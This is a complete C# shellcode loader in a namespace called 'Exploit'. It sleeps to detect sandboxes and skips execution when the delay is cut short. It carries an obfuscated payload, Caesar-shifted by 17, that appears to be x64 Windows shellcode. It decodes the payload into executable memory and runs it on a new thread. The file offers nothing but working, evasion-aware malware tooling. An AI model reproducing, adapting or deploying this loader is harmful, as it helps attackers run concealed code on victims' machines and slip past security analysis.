using System.Runtime.InteropServices;
using System;

namespace Exploit
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            byte[] buf = new byte[] { 0x0d,0x59,0x94,0xf5,0x01,0xf9,0xdd,0x11,0x11,0x11,0x52,0x62,0x52,0x61,0x63,0x62,0x59,0x42,0xe3,0x67,0x76,0x59,0x9c,0x63,0x71,0x59,0x9c,0x63,0x29,0x59,0x9c,0x63,0x31,0x5e,0x42,0xda,0x59,0x9c,0x83,0x61,0x59,0x20,0xc8,0x5b,0x5b,0x59,0x42,0xd1,0xbd,0x4d,0x72,0x8d,0x13,0x3d,0x31,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0xf3,0xfe,0x63,0x59,0x9c,0x63,0x31,0x9c,0x53,0x4d,0x59,0x12,0xe1,0x77,0x92,0x89,0x29,0x1c,0x13,0x52,0x62,0x20,0x96,0x83,0x11,0x11,0x11,0x9c,0x91,0x99,0x11,0x11,0x11,0x59,0x96,0xd1,0x85,0x78,0x59,0x12,0xe1,0x55,0x9c,0x51,0x31,0x61,0x9c,0x59,0x29,0x5a,0x12,0xe1,0xf4,0x67,0x5e,0x42,0xda,0x59,0x10,0xda,0x52,0x9c,0x45,0x99,0x59,0x12,0xe7,0x59,0x42,0xd1,0xbd,0x52,0xd2,0xda,0x1e,0x52,0x12,0xd2,0x49,0xf1,0x86,0x02,0x5d,0x14,0x5d,0x35,0x19,0x56,0x4a,0xe2,0x86,0xe9,0x69,0x55,0x9c,0x51,0x35,0x5a,0x12,0xe1,0x77,0x52,0x9c,0x1d,0x59,0x55,0x9c,0x51,0x2d,0x5a,0x12,0xe1,0x52,0x9c,0x15,0x99,0x52,0x69,0x59,0x12,0xe1,0x52,0x69,0x6f,0x6a,0x6b,0x52,0x69,0x52,0x6a,0x52,0x6b,0x59,0x94,0xfd,0x31,0x52,0x63,0x10,0xf1,0x69,0x52,0x6a,0x6b,0x59,0x9c,0x23,0xfa,0x5c,0x10,0x10,0x10,0x6e,0x5a,0xcf,0x88,0x84,0x43,0x70,0x44,0x43,0x11,0x11,0x52,0x67,0x5a,0x9a,0xf7,0x59,0x92,0xfd,0xb1,0x12,0x11,0x11,0x5a,0x9a,0xf6,0x5a,0xcd,0x13,0x11,0x12,0xcc,0xd1,0xb9,0x42,0x5e,0x52,0x65,0x5a,0x9a,0xf5,0x5d,0x9a,0x02,0x52,0xcb,0x5d,0x88,0x37,0x18,0x10,0xe6,0x5d,0x9a,0xfb,0x79,0x12,0x12,0x11,0x11,0x6a,0x52,0xcb,0x3a,0x91,0x7c,0x11,0x10,0xe6,0x7b,0x1b,0x52,0x6f,0x61,0x61,0x5e,0x42,0xda,0x5e,0x42,0xd1,0x59,0x10,0xd1,0x59,0x9a,0xd3,0x59,0x10,0xd1,0x59,0x9a,0xd2,0x52,0xcb,0xfb,0x20,0xf0,0xf1,0x10,0xe6,0x59,0x9a,0xd8,0x7b,0x21,0x52,0x69,0x5d,0x9a,0xf3,0x59,0x9a,0x0a,0x52,0xcb,0xaa,0xb6,0x85,0x72,0x10,0xe6,0x96,0xd1,0x85,0x1b,0x5a,0x10,0xdf,0x86,0xf6,0xf9,0xa4,0x11,0x11,0x11,0x59,0x94,0xfd,0x21,0x59,0x9a,0xf3,0x5e,0x42,0xda,0x7b,0x15,0x52,0x69,0x59,0x9a,0x0a,0x52,0xcb,0x13,0xea,0xd9,0x70,0x10,0xe6,0x94,0x09,0x11,0x8f,0x66,0x59,0x94,0xd5,0x31,0x6f,0x9a,0x07,0x7b,0x51,0x52,0x6a,0x79,0x11,0x21,0x11,0x11,0x52,0x69,0x59,0x9a,0x03,0x59,0x42,0xda,0x52,0xcb,0x69,0xb5,0x64,0xf6,0x10,0xe6,0x59,0x9a,0xd4,0x5a,0x9a,0xd8,0x5e,0x42,0xda,0x5a,0x9a,0x01,0x59,0x9a,0xeb,0x59,0x9a,0x0a,0x52,0xcb,0x13,0xea,0xd9,0x70,0x10,0xe6,0x94,0x09,0x11,0x8e,0x39,0x69,0x52,0x68,0x6a,0x79,0x11,0x51,0x11,0x11,0x52,0x69,0x7b,0x11,0x6b,0x52,0xcb,0x1c,0x40,0x20,0x41,0x10,0xe6,0x68,0x6a,0x52,0xcb,0x86,0x7f,0x5e,0x72,0x10,0xe6,0x5a,0x10,0xdf,0xfa,0x4d,0x10,0x10,0x10,0x59,0x12,0xd4,0x59,0x3a,0xd7,0x59,0x96,0x07,0x86,0xc5,0x52,0x10,0xf8,0x69,0x7b,0x11,0x6a,0xcc,0xf1,0x2e,0x3b,0x1b,0x52,0x9a,0xeb,0x10,0xe6 };

            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);

            // Decrypt Caesar Cipher Buffer
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint) buf[i] - 17) & 0xFF);
            }
            
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}